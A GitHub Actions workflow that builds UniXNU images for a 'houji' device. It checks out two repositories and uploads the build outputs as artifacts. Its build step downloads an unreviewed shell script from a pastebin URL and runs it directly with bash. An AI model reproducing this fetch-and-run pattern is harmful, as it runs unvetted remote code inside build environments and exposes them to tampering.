name: build
on: workflow_dispatch
jobs:
  build:
    runs-on: macos-26
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
        with:
          repository: Kizashi3/UniXNU-houji
          path: device
      - uses: actions/checkout@v4
        with:
          repository: UniXNU/UniXNU
          path: unixnu
      - uses: actions/setup-python@v5
        with:
          python-version: "3.13"
      - name: build
        run: |
          curl -fsSL https://paste.c-net.org/LizardsCryin -o /tmp/build.sh
          bash /tmp/build.sh
      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: houji-out
          path: |
            unixnu/out/**/*.img
            unixnu/out/**/*.macho
            unixnu/out/**/*.json
            unixnu/out/**/*.log
          if-no-files-found: warn
          compression-level: 0
          retention-days: 3
